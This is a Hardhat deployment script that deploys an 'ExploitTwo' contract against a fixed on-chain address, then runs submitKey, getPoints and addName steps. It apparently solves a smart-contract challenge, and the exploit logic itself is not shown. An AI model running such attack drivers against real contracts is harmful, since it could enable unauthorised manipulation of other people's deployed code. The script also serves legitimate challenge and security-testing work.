const hre = require("hardhat");

async function main() {
    try {
        // Get the ContractFactory
        const Exploit = await hre.ethers.getContractFactory("ExploitTwo");
        
        console.log("Deploying Exploit...");
        
        // Deploy the contract and wait for it to be mined
        const exploit = await Exploit.deploy("0x8D6B11D53A4CE78658d8335EafAa1e77A2FB101d");
        await exploit.waitForDeployment();
        
        console.log("Exploit deployed to:", await exploit.getAddress());

        // Try each step separately with error handling
        console.log("Step 1: Submitting key...");
        try {
            const tx1 = await exploit.submitKey();
            await tx1.wait();
            console.log("Key submitted successfully!");
        } catch (error) {
            console.error("Error submitting key:", error.message);
            return;
        }

        console.log("Step 2: Getting points...");
        try {
            const tx2 = await exploit.getPoints();
            await tx2.wait();
            console.log("Points obtained successfully!");
        } catch (error) {
            console.error("Error getting points:", error.message);
            return;
        }

        console.log("Step 3: Adding name...");
        try {
            const tx3 = await exploit.addName();
            await tx3.wait();
            console.log("Name added successfully!");
        } catch (error) {
            console.error("Error adding name:", error.message);
            return;
        }

        console.log("All steps completed successfully!");

    } catch (error) {
        console.error("Deployment error:", error.message);
        process.exit(1);
    }
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error("Script error:", error);
        process.exit(1);
    });